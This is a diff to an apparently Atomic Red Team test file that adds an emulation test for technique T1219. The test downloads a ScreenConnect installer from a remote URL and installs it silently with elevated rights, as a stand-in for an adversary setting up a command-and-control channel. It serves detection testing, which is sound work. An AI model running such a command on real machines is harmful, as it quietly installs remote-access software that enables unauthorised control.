@@ -70,3 +70,19 @@ atomic_tests:
       try{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}
     name: powershell
     elevation_required: true
+- name: ScreenConnect Application Download and Install on Windows
+  description: |
+    An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.
+    Msiexec will be used to quietly insall ScreenConnect.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
+      Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"
+      msiexec /i $installer /qn
+    cleanup_command:
+      $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
+      msiexec /x $installer /qn
+    name: powershell
+    elevation_required: true
